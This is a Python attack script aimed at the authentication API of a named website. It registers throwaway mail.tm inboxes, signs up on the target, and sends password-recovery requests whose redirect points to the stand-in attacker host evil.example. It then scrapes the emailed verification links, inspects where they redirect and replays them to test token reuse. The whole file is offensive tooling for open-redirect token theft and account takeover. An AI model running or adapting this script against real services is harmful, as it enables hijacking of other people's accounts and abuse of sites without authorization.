import ssl, json, os, urllib.request, urllib.error, urllib.parse, sys, time, random, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
ctx = ssl.create_default_context()
KEY = "<publishable-key>"
SUPA = "https://cdn.onlyfakeai.ru"
MT = "https://api.mail.tm"
ACC_FILE = "mailtm_account.json"

def req(method, url, body=None, token=None, extra=None, follow=True):
    h = {"User-Agent": "Mozilla/5.0", "Accept": "application/json", "Content-Type": "application/json"}
    if token: h["Authorization"] = f"Bearer {token}"
    if extra: h.update(extra)
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    class NoRedir(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *a, **k): return None
    opener = urllib.request.build_opener(urllib.request.HTTPRedirectHandler() if follow else NoRedir)
    try:
        with opener.open(r, timeout=30) as resp:
            return resp.status, dict(resp.headers), resp.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8", "ignore")
    except Exception as e:
        return 0, {}, repr(e)

def get_account():
    if os.path.exists(ACC_FILE):
        d = json.load(open(ACC_FILE))
        st, hd, b = req("POST", MT + "/token", {"address": d["address"], "password": d["password"]})
        if st == 200:
            return d["address"], d["password"], json.loads(b)["token"]
    st, hd, b = req("GET", MT + "/domains")
    print("domains:", st, b[:120])
    data = json.loads(b)
    members = data["hydra:member"] if isinstance(data, dict) else data
    dom = members[0]["domain"]
    login = "authflow" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=6))
    addr, pw = f"{login}@{dom}", "Mx7#qL2!vB9$wR4"
    st, hd, b = req("POST", MT + "/accounts", {"address": addr, "password": pw})
    print("create account:", st, b[:160])
    if st == 429:
        wait = int(hd.get("Retry-After", "60"))
        print(f"429, waiting {wait}s"); time.sleep(wait + 2)
        st, hd, b = req("POST", MT + "/accounts", {"address": addr, "password": pw})
        print("retry create:", st, b[:120])
    st, hd, b = req("POST", MT + "/token", {"address": addr, "password": pw})
    tok = json.loads(b).get("token") if st == 200 else None
    json.dump({"address": addr, "password": pw}, open(ACC_FILE, "w"))
    return addr, pw, tok

def msgs(tok):
    st, hd, b = req("GET", MT + "/messages", token=tok)
    try:
        d = json.loads(b)
        return d.get("hydra:member", []) if isinstance(d, dict) else (d if isinstance(d, list) else [])
    except Exception:
        return []

addr, pw, tok = get_account()
print("account:", addr, "token:", bool(tok))
if not tok:
    sys.exit(1)

# check whether already registered on target
st, hd, b = req("GET", SUPA + "/auth/v1/user", token="x", extra={"apikey": KEY})
EMAIL = addr
PWT = "Zq7#vL2!mX9$wR4"
st, hd, b = req("POST", SUPA + "/auth/v1/signup", {"email": EMAIL, "password": PWT}, extra={"apikey": KEY})
print("signup:", st, b[:100])

deep = "https://onlyfakeai.ru/login?redirect=https%3A%2F%2Fevil.example%2Fpwn"
st, hd, b = req("POST", SUPA + "/auth/v1/recover", {"email": EMAIL, "redirect_to": deep}, extra={"apikey": KEY})
print("recover deep:", st, b[:120])

found = []
for i in range(15):
    time.sleep(3)
    found = msgs(tok)
    if found:
        break
print("messages:", len(found))
for m in found:
    st, hd, b = req("GET", MT + f"/messages/{m['id']}", token=tok)
    try:
        d = json.loads(b)
    except Exception:
        print("raw:", b[:500]); continue
    print("\nMESSAGE KEYS:", list(d.keys()))
    print("from:", d.get("from"), "subject:", d.get("subject"))
    print("text:", repr(d.get("text"))[:600])
    print("html:", repr(d.get("html"))[:1200])
    parts = [d.get("text") or ""]
    h = d.get("html")
    if isinstance(h, list): parts += [x for x in h if isinstance(x, str)]
    elif isinstance(h, str): parts.append(h)
    body = "\n".join(parts)
    links = re.findall(r"https?://[^\s\"'<>\)]+", body)
    print("LINKS:")
    for u in links:
        print("   ", u[:500])
    for u in links:
        if "verify" in u or "token=" in u:
            u = u.replace("&amp;", "&")
            st2, hd2, b2 = req("GET", u, extra={"apikey": KEY}, follow=False)
            loc = hd2.get("Location") or hd2.get("location") or ""
            print("\nCLICK ->", st2, "Location:", loc[:600])
            st3, hd3, b3 = req("GET", u, extra={"apikey": KEY}, follow=False)
            print("REPLAY ->", st3, b3[:200])
